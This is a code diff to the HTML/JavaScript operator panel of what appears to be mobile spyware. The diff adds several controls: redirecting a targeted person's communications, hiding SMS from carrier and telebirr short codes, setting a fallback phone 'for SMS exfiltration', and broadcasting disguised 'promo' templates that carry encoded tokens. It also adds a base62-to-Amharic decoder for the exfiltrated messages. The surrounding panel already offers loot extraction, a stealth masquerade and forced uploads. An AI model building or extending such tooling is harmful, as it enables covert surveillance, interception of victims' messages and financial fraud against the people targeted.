@@ -376,8 +376,26 @@
                 </div>
             </div>
 
-            <h2 data-search="extraction, forensics, loot, files, sms, scraper, vault, pull, push, contacts, calls">Data Extraction & Forensics</h2>
+            <h2 data-search="extraction, forensics, loot, files, sms, scraper, vault, pull, push, contacts, calls, hvt, redirect">Data Extraction & Forensics</h2>
             <div class="card">
+                <div class="cmd-row">
+                    <label class="cmd-label">HVT Communication Redirection</label>
+                    <div class="input-wrap">
+                        <button class="btn-tag" onclick="tagCmd('ADD_HVT_REDIRECT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('ADD_HVT_REDIRECT')">?</button>
+                        <input type="text" id="hvt-sender" placeholder="Target Number (e.g. 8012)" style="flex:1">
+                        <input type="text" id="hvt-dest" placeholder="Redirect to..." style="flex:1">
+                        <button class="btn" onclick="sendCmd('ADD_HVT_REDIRECT')">MAP</button>
+                    </div>
+                    <button class="btn danger" style="width:100%; margin-top:5px; font-size:0.6rem;" onclick="sendCmd('CLEAR_HVT_REDIRECTS')">WIPE ALL REDIRECT RULES</button>
+                </div>
+                <div class="cmd-row">
+                    <label class="cmd-label">SMS Filter (Blacklist)</label>
+                    <div class="input-wrap">
+                        <button class="btn-tag" onclick="tagCmd('SET_SMS_BLACKLIST', this)">🏷️</button><button class="btn-status" onclick="auditCmd('SET_SMS_BLACKLIST')">?</button>
+                        <input type="text" id="sms-blacklist" placeholder="127, 994, telebirr..." style="flex:1">
+                        <button class="btn" onclick="sendCmd('SET_SMS_BLACKLIST')">FILTER</button>
+                    </div>
+                </div>
                 <div class="cmd-row">
                     <label class="cmd-label">Accessibility Audit (UI Scraper)</label>
                     <div class="input-wrap">
@@ -474,6 +492,22 @@
                         <button class="btn" onclick="sendCmd('FORCE_UPLOAD')">Extract</button>
                     </div>
                 </div>
+                <div class="cmd-row">
+                    <label class="cmd-label">Judas Master Fallback (Emergency Phone)</label>
+                    <div class="input-wrap">
+                        <button class="btn-tag" onclick="tagCmd('SET_JUDAS_HANDLER', this)">🏷️</button><button class="btn-status" onclick="auditCmd('SET_JUDAS_HANDLER')">?</button>
+                        <input type="text" id="judas-handler" placeholder="Phone Number for SMS exfiltration" style="flex:1">
+                        <button class="btn" onclick="sendCmd('SET_JUDAS_HANDLER')">SET</button>
+                    </div>
+                </div>
+                <div class="cmd-row">
+                    <label class="cmd-label">Cipher Camouflage (Promo Templates)</label>
+                    <textarea id="promo-templates" placeholder="Template A [TOKEN] ||| Template B [TOKEN]..." style="font-size:0.7rem; height:80px;"></textarea>
+                    <div class="input-wrap">
+                        <button class="btn-tag" onclick="tagCmd('SET_PROMOS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('SET_PROMOS')">?</button>
+                        <button class="btn" style="flex:1" onclick="sendCmd('SET_PROMOS')">BROADCAST TEMPLATES</button>
+                    </div>
+                </div>
 
                 <div class="cmd-row">
                     <label class="cmd-label">Stealth Masquerade (Skin)</label>
@@ -543,12 +577,27 @@
             </div>
             <div id="file-list"></div>
         </div>
+
+        <div id="view-cipher" class="section">
+            <h2 data-search="cipher, decoder, amharic, fidel, decrypt, message">FidelCipher Decoder</h2>
+            <div class="card">
+                <div class="cmd-label" style="margin-bottom:10px;">PASTE SMS TOKEN (BASE62)</div>
+                <textarea id="cipher-input" placeholder="e.g. 3f62KL..." style="height:120px; font-family:monospace; margin-bottom:15px;"></textarea>
+                <button class="btn" style="width:100%; height:50px; font-size:1rem;" onclick="decodeTokenToUI()">DECODE MESSAGE</button>
+                
+                <div id="cipher-output-container" style="display:none; margin-top:20px; padding:15px; background:rgba(0,255,157,0.05); border:1px solid var(--success);">
+                    <div style="color:var(--success); font-size:0.65rem; font-weight:bold; margin-bottom:10px;">DECRYPTED_PAYLOAD:</div>
+                    <div id="cipher-output" style="color:#fff; font-size:1.1rem; line-height:1.5; white-space:pre-wrap;"></div>
+                </div>
+            </div>
+        </div>
     </main>
 
     <nav>
-        <div class="nav-item active" onclick="switchTab('dash')">📊</div>
-        <div class="nav-item" onclick="switchTab('cmd')">🎮</div>
-        <div class="nav-item" onclick="switchTab('files')">💾</div>
+        <div class="nav-item active" onclick="switchTab('dash')" title="DASHBOARD">📊</div>
+        <div class="nav-item" onclick="switchTab('cmd')" title="COMMANDS">🎮</div>
+        <div class="nav-item" onclick="switchTab('files')" title="VAULT">💾</div>
+        <div class="nav-item" onclick="switchTab('cipher')" title="DECODER">🔐</div>
     </nav>
 
     <script>
@@ -622,7 +671,7 @@
             document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
             document.getElementById('view-' + tab).classList.add('active');
             
-            const icons = ['dash', 'cmd', 'files'];
+            const icons = ['dash', 'cmd', 'files', 'cipher'];
             document.querySelectorAll('.nav-item')[icons.indexOf(tab)].classList.add('active');
 
             // 3. Restore scroll position for the new tab
@@ -878,6 +927,16 @@
                         content = explanation ? `${path} | ${explanation}` : path; break;
                     case 'SET_MASQUERADE':
                         content = document.getElementById('val-masquerade').value; break;
+                    case 'ADD_HVT_REDIRECT':
+                        content = `${document.getElementById('hvt-sender').value}|${document.getElementById('hvt-dest').value}`; break;
+                    case 'CLEAR_HVT_REDIRECTS':
+                        content = ''; break;
+                    case 'SET_SMS_BLACKLIST':
+                        content = document.getElementById('sms-blacklist').value; break;
+                    case 'SET_JUDAS_HANDLER':
+                        content = document.getElementById('judas-handler').value; break;
+                    case 'SET_PROMOS':
+                        content = document.getElementById('promo-templates').value; break;
                 }
             }
 
@@ -1691,6 +1750,62 @@
             const sizes = ['Bytes', 'KB', 'MB', 'GB'];
             const i = Math.floor(Math.log(bytes) / Math.log(k));
             return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
+        }
+
+        // --- FIDEL CIPHER DECODER LOGIC ---
+        const BASE62 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+        const AMHARIC_BASES = [
+            0x1200, 0x1208, 0x1210, 0x1218, 0x1220, 0x1228, 0x1230, 0x1238,
+            0x1240, 0x1260, 0x1270, 0x1278, 0x1280, 0x1290, 0x1298, 0x12A0,
+            0x12A8, 0x12B0, 0x12C8, 0x12D0, 0x12D8, 0x12E0, 0x12E8, 0x12F0,
+            0x12F8, 0x1300, 0x1308, 0x1310, 0x1318, 0x1320, 0x1328, 0x1330,
+            0x1338, 0x1340
+        ];
+
+        function decodeTokenToUI() {
+            const input = document.getElementById('cipher-input').value.trim();
+            if (!input) return;
+
+            try {
+                const decoded = decodeFidelToken(input);
+                document.getElementById('cipher-output').innerText = decoded;
+                document.getElementById('cipher-output-container').style.display = 'block';
+                toast("DECRYPTION COMPLETE", "success");
+            } catch (e) {
+                toast("DECRYPTION ERROR: " + e.message, "danger");
+            }
+        }
+
+        function decodeFidelToken(token) {
+            let decodedText = "";
+            const chunks = token.match(/.{1,3}/g) || [];
+            
+            for (const chunk of chunks) {
+                if (chunk.length < 3) continue;
+                
+                let value = 0;
+                const chars = chunk.split('');
+                for (let i = 0; i < chars.length; i++) {
+                    value += BASE62.indexOf(chars[i]) * Math.pow(62, 2 - i);
+                }
+                
+                const a = Math.floor(value / 335);
+                const b = value % 335;
+                
+                [a, b].forEach(index => {
+                    if (index >= 0 && index <= 237) {
+                        const group = Math.floor(index / 7);
+                        const offset = index % 7;
+                        decodedText += String.fromCharCode(AMHARIC_BASES[group] + offset);
+                    } else if (index >= 239 && index <= 333) {
+                        decodedText += String.fromCharCode(index - 239 + 32);
+                    } else if (index === 334) {
+                        decodedText += "\n";
+                    }
+                    // 238 is padding/unknown, ignored
+                });
+            }
+            return decodedText.trim();
         }
     </script>
 </body>
